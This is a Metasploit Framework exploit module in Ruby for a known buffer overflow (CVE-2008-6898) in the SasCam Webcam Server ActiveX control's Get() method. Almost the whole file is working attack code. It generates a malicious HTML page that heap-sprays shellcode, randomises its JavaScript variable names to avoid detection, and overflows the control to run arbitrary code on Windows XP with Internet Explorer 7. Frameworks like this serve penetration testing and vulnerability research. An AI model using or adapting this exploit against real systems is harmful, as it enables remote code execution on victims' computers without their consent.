##
# $Id: sascam_get.rb 10477 2010-09-25 11:59:02Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = LowRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SasCam Webcam Server v.2.6.5 Get() method Buffer Overflow',
			'Description'    => %q{
				The SasCam Webcam Server ActiveX control is vulnerable to a buffer overflow.
				By passing an overly long argument via the Get method, a remote attacker could
				overflow a buffer and execute arbitrary code on the system with the privileges
				of the user. This control is not marked safe for scripting, please choose your
				attack vector carefully.
				},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'dean <dean [at] zerodaysolutions [dot] com>' ],
			'Version'        => '$Revision: 10477 $',
			'References'     =>
				[
					[ 'CVE', '2008-6898' ],
					[ 'OSVDB', '55945'],
					[ 'BID','33053' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3 / IE 7', { 'Ret' => 0x0c0c0c0c } ]
				],
			'DisclosureDate' => 'Dec 29 2008',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.html']),
			], self.class)
	end

	def exploit

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Set the return.
		ret     = Rex::Text.uri_encode([target.ret].pack('L'))

		# Randomize the javascript variable names.
		vname  = rand_text_alpha(rand(100) + 1)
		var_i  = rand_text_alpha(rand(30)  + 2)
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)
		rand3  = rand_text_alpha(rand(100) + 1)
		rand4  = rand_text_alpha(rand(100) + 1)
		rand5  = rand_text_alpha(rand(100) + 1)
		rand6  = rand_text_alpha(rand(100) + 1)
		rand7  = rand_text_alpha(rand(100) + 1)
		rand8  = rand_text_alpha(rand(100) + 1)

		content = %Q|<html>
<object id='#{vname}' classid='clsid:0297D24A-F425-47EE-9F3B-A459BCE593E3'></object>
<script language="JavaScript">
var #{rand1} = unescape('#{shellcode}');
var #{rand2} = unescape('#{ret}');
var #{rand3} = 20;
var #{rand4} = #{rand3} + #{rand1}.length;
while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};
var #{rand5} = #{rand2}.substring(0,#{rand4});
var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});
while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};
var #{rand7} = new Array();
for (#{var_i} = 0; #{var_i} < 800; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }
var #{rand8} = "";
for (#{var_i} = 0; #{var_i} < 8293; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') }
#{vname}.Get(#{rand8});
</script>
</html>
|

		# create the file
		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(content)

	end

end
